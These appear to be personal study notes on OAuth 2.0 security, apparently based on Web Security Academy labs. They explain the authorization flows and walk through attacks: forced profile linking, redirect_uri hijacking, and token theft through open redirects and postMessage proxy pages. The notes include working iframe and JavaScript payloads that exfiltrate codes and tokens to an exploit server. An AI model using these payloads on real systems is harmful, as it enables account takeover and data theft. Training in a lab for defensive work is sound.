## Definition
commonly used authorization framework that:
- enables websites and web apps to request limited access to a user's account on another app
Crucially:
- OAuth allows the user to grant this access 
	- without exposing their login credentials to the requesting application
=>
users can:
- fine-tune which data they want to share 
- rather than having to hand over full control of their account to a third party.

The basic OAuth process:
- is widely used to integrate third-party functionality 
	- that requires access to certain data from a user's account
- For example:
	- an app might use OAuth to -->     request access to your email contacts list so that it 
	                             can suggest people to connect with. 
	- However, the same mechanism is also used to:
		- provide third-party authentication services
			- allowing users to log in with an account 
			  that they have with a different website

## How OAuth 2.0 works
It works by -->  defining a series of interactions between three distinct parties, 
              namely: 
- **Client application** - The website or web app that wants to access the user's data.
- **Resource owner** - The user whose data the client app wants to access.
- **OAuth service provider** - The website/app that controls the user's data and access to it.                                             They support OAuth by:
                         providing an API for interacting with both an authorization server and a resource server.

There are numerous different ways that the actual OAuth process can be implemented
they are known as -->  grant types
We'll focus on the -->  "<span style="color:rgb(0, 186, 80)">authorization code</span>" and "<span style="color:rgb(0, 186, 80)">implicit</span>" grant types

Both of these grant types involve the following stages:
1. The client app requests access to a subset of the user's data
	1. specifying which grant type they want to use and what kind of access they want.
2. The user is prompted to log in to the OAuth service and explicitly give their consent for the requested access.
3. The client app receives a unique access token that proves they have permission from the user to access the requested data. 
	1. Exactly how this happens varies significantly depending on the grant type.
4. The client app uses this access token to make API calls fetching the relevant data from the resource server

### OAuth authentication
OAuth has evolved into a -->  means of authenticating users as well. 
For example:
you're probably familiar with the option many websites provide to log in using your existing social media account rather than having to register with the website in question. 
=>
Whenever you see this option, there's a good chance it is built on -->   OAuth 2.0

For OAuth authentication mechanisms:
- the basic OAuth flows remain largely the same
- the main difference is how the client app uses the data that it receives:
	- From an end-user perspective:
		- the result of OAuth authentication is something that broadly resembles SAML-based single sign-on (SSO). 
		  (In these materials, we'll focus exclusively on vulnerabilities in this SSO-like use case)

OAuth authentication is generally implemented as follows:
1. The user chooses the option to log in with their social media account. 
	1. The client app then uses the social media site's OAuth service to request access to some data that it can use to identify the user. 
	2. This could be the email address that is registered with their account, for example
	   
2. After receiving an access token:
	1. the client app requests this data from the resource server, typically from a dedicated `/userinfo` endpoint
	   
3. Once it has received the data:
	1. the client app uses it in place of a username to log the user in. 
	2. The access token that it received from the authorization server is often used instead of a traditional password.

You can see a simple example of how this looks in the following lab:
- Just complete the "Log in with social media" option while proxying traffic through Burp
- study the series of OAuth interactions in the proxy history. 
- You can log in using the credentials `wiener:peter`. 
- Note that this implementation is deliberately vulnerable - we'll teach you how to exploit this later.


1. While proxying traffic through Burp, click "My account" and complete the OAuth login process. 
	1. Afterwards, you will be redirected back to the blog website.
2. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that make up the OAuth flow. 
	1. This starts from the authorization request `GET /auth?client_id=[...]`.
	   
3. Notice that the client app (the blog website) receives some basic information about the user from the OAuth service. 
	1. It then logs the user in by sending a `POST` request containing this information to its own `/authenticate` endpoint, along with the access token.
	   
4. Send the `POST /authenticate` request to Burp Repeater. 
	1. In Repeater, change the email address to `carlos@carlos-montoya.net` 
	2. send the request. 
	3. Observe that you do not encounter an error.
5. Right-click on the `POST` request 
	1. select "Request in browser" > "In original session". 
	2. Copy this URL and visit it in the browser. 
	3. You are logged in as Carlos and the lab is solved

## Identifying OAuth authentication
The most reliable way to identify OAuth authentication is to:
- proxy your traffic through Burp 
- check the corresponding HTTP messages when you use this login option

Regardless of which OAuth grant type is being used:
- the first request of the flow will always be a request to the `/authorization` endpoint
	- containing a number of query parameters that are used specifically for OAuth. 
	- In particular, keep an eye out for the `client_id`, `redirect_uri`, and `response_type` parameters. 
	  For example, an authorization request will usually look something like this:
`GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 
`Host: oauth-authorization-server.com`

## Recon
If an external OAuth service is used:
- you should be able to identify the specific provider:
	- from the hostname 
	- to which the authorization request is sent
- As these services provide a public API:
	- there is often detailed doc available that should tell you all kinds of useful info
		- such as the exact names of the endpoints 
		- which configuration options are being used

Once you know the hostname of the authorization server:
- you should always try sending a `GET` request to the following standard endpoints:
	- `/.well-known/oauth-authorization-server`
	- `/.well-known/openid-configuration`
	  
These will often return:
- a JSON configuration file containing key information:
	- such as details of additional features that may be supported. 
- This will sometimes tip you off:
	- about a wider attack surface 
	- supported features that may not be mentioned in the documentation

## Exploiting OAuth authentication vulnerabilities
Vulnerabilities can arise in:
- the client application's implementation of OAuth 
- the configuration of the OAuth service itself

### Vulnerabilities in the OAuth client application
the OAuth specification is relatively -->  loosely defined
This is especially true with regard to the implementation -->  by the client application
=>
There are a lot of moving parts in an OAuth flow:
- with many optional parameters 
- and configuration settings in each grant type,
  =>
  which means there's plenty of scope for misconfigurations

#### Improper implementation of the implicit grant type
Due to the dangers introduced by sending access tokens via the browser:
- the [implicit grant type](https://portswigger.net/web-security/oauth/grant-types#implicit-grant-type) is mainly recommended for single-page applications
- However:
	- it is also often used in classic client-server web app bc of its relative simplicity.

In this flow, the access token is sent:
- from the OAuth service 
- to the client app 
- via the user's browser as a URL fragment. 

The client application then:
- accesses the token using JavaScript

The trouble is, if the application:
- wants to maintain the session -->   after the user closes the page
  =>
  it needs to store the current user data (normally a user ID and the access token) somewhere.

To solve this problem:
- the client app will often submit this data to the server in a `POST` request 
- then assign the user a session cookie, effectively logging them in.
- This request is roughly equivalent t:
	- the form submission request that might be sent as part of a classic, password-based login. 
- However, in this scenario:
	- the server does not have any secrets or passwords to compare with the submitted data
	  =>
	  which means that it is implicitly trusted.

In the implicit flow, this `POST` request:
- is exposed to attackers via their browser.
- As a result:
	- this behavior can lead to a serious vulnerability if:
		- the client app doesn't properly check that the access token:
			- matches the other data in the request. 
			- In this case, an attacker can:
				- simply change the params sent to the server to impersonate any user

#### Flawed CSRF protection
Although many components of the OAuth flows are optional:
- some of them are strongly recommended 
- unless there's an important reason not to use them
- One such example is the -->  `state` parameter

The `state` parameter:
- should ideally contain an unguessable value
	- such as the hash of something tied to the user's session when it first initiates the OAuth flow
- This value is then:
	- passed back and forth between the client app and the OAuth service 
		- as a form of CSRF token for the client application. 
	- Therefore, if you notice that:
		- the authorization request does not send a `state` parameter
		  =>
		- this is extremely interesting from an attacker's perspective
		- It potentially means that:
			- they can initiate an OAuth flow themselves 
			- before tricking a user's browser into completing it
			  (similar to a traditional [CSRF attack](https://portswigger.net/web-security/csrf))
			  
		- This can have severe consequences depending on how OAuth is being used by the client application.

Consider a website that:
- allows users to log in using either a classic, password-based mechanism or by linking their account to a social media profile using OAuth
- In this case, if the app:
	- fails to use the `state` parameter
	  =>
		- an attacker could potentially:
			- hijack a victim user's account on the client app 
				- by binding it to their own social media account

##### Forced OAuth profile linking
1. While proxying traffic through Burp, click "My account". 
	1. You are taken to a normal login page
	2. but notice that there is an option to log in using your social media profile instead.
	3. For now, just log in to the blog website directly using the classic login form.
	   
2. Notice that you have the option to attach your social media profile to your existing account.
3. Click "Attach a social profile". 
4. You are redirected to the social media website
	1. where you should log in using your social media credentials to complete the OAuth flow. 
	2. Afterwards, you will be redirected back to the blog website.
	   
5. Log out and then click "My account" to go back to the login page. 
	1. This time, choose the "Log in with social media" option. 
	2. Observe that you are logged in instantly via your newly linked social media account

6. In the proxy history, study the series of requests for attaching a social profile. 
	1. In the `GET /auth?client_id[...]` request, observe that the `redirect_uri` for this functionality sends the authorization code to `/oauth-linking`.
	2. Importantly, notice that the request does not include a `state` parameter to protect against CSRF attacks.
7. Turn on proxy interception and select the "Attach a social profile" option again.
8. Go to Burp Proxy and forward any requests until you have intercepted the one for `GET /oauth-linking?code=[...]`.
9. Right-click on this request and select "Copy URL".
10. Drop the request. 
11. This is important to ensure that the code is not used and, therefore, remains valid.
12. Turn off proxy interception and log out of the blog website.
13. Go to the exploit server and create an `iframe` in which the `src` attribute points to the the code that you have inside the URL you just copied. 
14. The result should look something like this:
    `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>`
11. Deliver the exploit to the victim. 
	1. When their browser loads the `iframe`, it will complete the OAuth flow using your social media profile, attaching it to the admin account on the blog website.
12. Go back to the blog website and select the "Log in with social media" option again. Observe that you are instantly logged in as the admin user.
13. Go to the admin panel and delete `carlos` to solve the lab

#### Leaking authorization codes and access tokens
Perhaps the most infamous OAuth-based vulnerability is:
- when the configuration of the OAuth service itself enables attackers to:
	- steal authorization codes or access tokens associated with other users' accounts. 
=>
By stealing a valid code or token:
- the attacker may be able to access the victim's data
- Ultimately, this can completely:
	- compromise their account 
	  =>
	  the attacker could potentially log in as the victim user on any client app that is registered with this OAuth service.

Depending on the grant type:
- either a code or token is sent via the victim's browser to the `/callback` endpoint specified in the `redirect_uri` parameter of the authorization request
- If the OAuth service fails to validate this URI properly:
	- an attacker may be able to construct a CSRF-like attack
	- tricking the victim's browser into initiating an OAuth flow
	- that will send the code or token to an attacker-controlled `redirect_uri`.

In the case of the authorization code flow:
- an attacker can potentially steal the victim's code -->  before it is used

They can then:
- send this code to the client application's legitimate `/callback` endpoint (the original `redirect_uri`) to get access to the user's account

In this scenario, an attacker:
- does not even need to know the client secret or the resulting access token. 
- As long as the victim has a valid session with the OAuth service:
	- the client app will simply complete the code/token exchange on the attacker's behalf before logging them in to the victim's account.

Note that using `state` or `nonce` protection:
- does not necessarily prevent these attacks 
- because an attacker can generate new values from their own browser

##### OAuth account hijacking via redirect_uri
1. While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.
2. Log out and then log back in again. 
	1. Observe that you are logged in instantly this time. 
	2. As you still had an active session with the OAuth service, you didn't need to enter your credentials again to authenticate yourself.
3. In Burp, study the OAuth flow in the proxy history and identify the **most recent** authorization request. 
	1. This should start with `GET /auth?client_id=[...]`. 
	2. Notice that when this request is sent, you are immediately redirected to the `redirect_uri` along with the authorization code in the query string. 
	3. Send this authorization request to Burp Repeater.
4. In Burp Repeater, observe that you can submit any arbitrary value as the `redirect_uri` without encountering an error. 
	1. Notice that your input is used to generate the redirect in the response.
5. Change the `redirect_uri` to point to the exploit server, then send the request and follow the redirect. 
	1. Go to the exploit server's access log and observe that there is a log entry containing an authorization code. 
	2. This confirms that you can leak authorization codes to an external domain.
6. Go back to the exploit server and create the following `iframe` at `/exploit`:
    `<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>`
    ![[Pasted image 20240916142024.png]]
7. Store the exploit and click "View exploit". 
8. Check that your `iframe` loads and then check the exploit server's access log. 
9. If everything is working correctly, you should see another request with a leaked code.
10. Deliver the exploit to the victim, then go back to the access log and copy the victim's code from the resulting request.
11. Log out of the blog website and then use the stolen code to navigate to:
    `https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE`
12. The rest of the OAuth flow will be completed automatically and you will be logged in as the admin user. Open the admin panel and delete `carlos` to solve the lab

#### Stealing codes and access tokens via a proxy page
Against more robust targets, you might find that:
no matter what you try -->   you are unable to successfully submit an external domain as the 
						 `redirect_uri`. 
However, that doesn't mean it's time to give up.

By this stage, you should have a relatively good understanding of which parts of the URI you can tamper with. 
=>
The key now is to:
- use this knowledge to try and access a wider attack surface within the client app itself.
- In other words:
	- try to work out whether you can change the `redirect_uri` parameter to point to any other pages on a whitelisted domain.
=>
Try to find ways that you can successfully access different subdomains or paths. 
For example:
- the default URI will often be on an OAuth-specific path, such as `/oauth/callback`
	- which is unlikely to have any interesting subdirectories.
- However, you may be able to use [directory traversal](https://portswigger.net/web-security/file-path-traversal) tricks to supply any arbitrary path on the domain. 
  Something like this:
  `https://client-app.com/oauth/callback/../../example/path`
  
  May be interpreted on the back-end as:
  `https://client-app.com/example/path`

Once you identify which other pages you are able to set as the redirect URI:
- you should audit them for additional vulnerabilities 
	- that you can potentially use to leak the code or token. 
	- For the authorization code flows and the implicit grant type:
		- you need to extract the URL fragment.

One of the most useful vulnerabilities for this purpose is -->  an open redirect
=>
You can use this as:
- a proxy to forward victims
- along with their code or token
- to an attacker-controlled domain 
- where you can host any malicious script you like.

Note that for the implicit grant type:
stealing an access token -->  doesn't just enable you to log in to the victim's account on the 
							client app
							
As the entire implicit flow takes place via the browser:
you can also use the token:
- to make your own API calls to the OAuth service's resource server.

This may enable you to:
- fetch sensitive user data 
	- that you cannot normally access from the client application's web UI

##### Stealing OAuth access tokens via an open redirect
- While proxying traffic through Burp, click "My account" and complete the OAuth login process.
- Afterwards, you will be redirected back to the blog website.
- Study the resulting requests and responses. 
	- Notice that the blog website makes an API call to the userinfo endpoint at `/me` and then uses the data it fetches to log the user in. 
	- Send the `GET /me` request to Burp Repeater.
- Log out of your account and log back in again. 
	- From the proxy history, find the most recent `GET /auth?client_id=[...]` request and send it to Repeater.
- In Repeater, experiment with the `GET /auth?client_id=[...]` request. 
	- Observe that you cannot supply an external domain as `redirect_uri` because it's being validated against a whitelist. 
	- However, you can append additional characters to the default value without encountering an error, including the `/../` [path traversal](https://portswigger.net/web-security/file-path-traversal) sequence.
- Log out of your account on the blog website and turn on proxy interception in Burp.
- In the browser, log in again and go to the intercepted `GET /auth?client_id=[...]` request in Burp Proxy.
- Confirm that the `redirect_uri` parameter is in fact vulnerable to [directory traversal](https://portswigger.net/web-security/file-path-traversal) by changing it to:
  `https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1`
	- Forward any remaining requests and observe that you are eventually redirected to the first blog post. 
	- In the browser, notice that your access token is included in the URL as a fragment.

- With the help of Burp, audit the other pages on the blog website. 
	- Identify the "Next post" option at the bottom of each blog post 
		- which works by redirecting users to the path specified in a query parameter.
		- Send the corresponding `GET /post/next?path=[...]` request to Repeater
		  
- In Repeater, experiment with the `path` parameter. 
	- Notice that this is an open redirect. 
	- You can even supply an absolute URL to elicit a redirect to a completely different domain, for example, your exploit server
	  
- Craft a malicious URL that combines these vulnerabilities. 
	- You need a URL that will initiate an OAuth flow with the `redirect_uri` pointing to the open redirect, which subsequently forwards the victim to your exploit server:
	  `https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email`
- Test that this URL works correctly by visiting it in the browser. 
	- You should be redirected to the exploit server's "Hello, world!" page, along with the access token in a URL fragment.
- On the exploit server, create a suitable script at `/exploit` that will extract the fragment and output it somewhere. 
	- For example, the following script will leak it via the access log by redirecting users to the exploit server for a second time, with the access token as a query parameter instead:
```html
<script>
window.location = '/?'+document.location.hash.substr(1)
</script>
```

- To test that everything is working correctly, store this exploit and visit your malicious URL again in the browser. 
	- Then, go to the exploit server access log. 
	- There should be a request for `GET /?access_token=[...]`
	  
- You now need to create an exploit that first forces the victim to visit your malicious URL and then executes the script you just tested to steal their access token. 
- For example:
```html
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```
- To test that the exploit works, store it and then click "View exploit". 
	- The page should appear to refresh, but if you check the access log, you should see a new request for `GET /?access_token=[...]`
	  
- Deliver the exploit to the victim, then copy their access token from the log.
- In Repeater, go to the `GET /me` request and replace the token in the `Authorization: Bearer` header with the one you just copied. 
	- Send the request. 
	- Observe that you have successfully made an API call to fetch the victim's data, including their API key.
- Use the "Submit solution" button at the top of the lab page to submit the stolen key and solve the lab



In addition to open redirects:
you should look for any other vulnerabilities that allow you to extract the code or token and send it to an external domain

Some good examples include:
- **Dangerous JS that handles query parameters and URL fragments**  
	- For example, insecure web messaging scripts can be great for this. 
	- In some scenarios:
		- you may have to identify a longer gadget chain that allows you to pass the token through a series of scripts before eventually leaking it to your external domain.
- **XSS vulnerabilities**  
	- Although XSS attacks can have a huge impact on their own:
		- there is typically a small time frame in which the attacker has access to the user's session before they close the tab or navigate away. 
	- As the `HTTPOnly` attribute is commonly used for session cookies:
		- an attacker will often also be unable to access them directly using XSS.
	- However, by stealing an OAuth code or token:
		- the attacker can gain access to the user's account in their own browser
	- This gives them much more time to explore the user's data and perform harmful actions, significantly increasing the severity of the XSS vulnerability.
- **HTML injection vulnerabilities**  
	- In cases where you cannot inject JavaScript: 
		- you may still be able to use a simple HTML injection to steal authorization codes.
	- If you can point the `redirect_uri` parameter to a page on which you can inject your own HTML content:
		- you might be able to leak the code via the `Referer` header. 
		- For example, consider the following `img` element: `<img src="evil-user.net">`:
			- When attempting to fetch this image:
				- some browsers (such as Firefox) will send the full URL in the `Referer` header of the request, including the query string

###### Stealing OAuth access tokens via a proxy page
- Study the OAuth flow while proxying traffic through Burp. Using the same method as in the [previous lab](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect), identify that the `redirect_uri` is vulnerable to [directory traversal](https://portswigger.net/web-security/file-path-traversal). This enables you to redirect access tokens to arbitrary pages on the blog website.
- Using Burp, audit the other pages on the blog website. Observe that the comment form is included as an `iframe` on each blog post. Look closer at the `/post/comment/comment-form` page in Burp and notice that it uses the `postMessage()` method to send the `window.location.href` property to its parent window. Crucially, it allows messages to be posted to any origin (`*`).
- From the proxy history, right-click on the `GET /auth?client_id=[...]` request and select "Copy URL". Go to the exploit server and create an `iframe` in which the `src` attribute is the URL you just copied. Use directory traversal to change the `redirect_uri` so that it points to the comment form. The result should look something like this:
    
    `<iframe src="https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>`
- Below this, add a suitable script that will listen for web messages and output the contents somewhere. For example, you can use the following script to reveal the web message in the exploit server's access log:


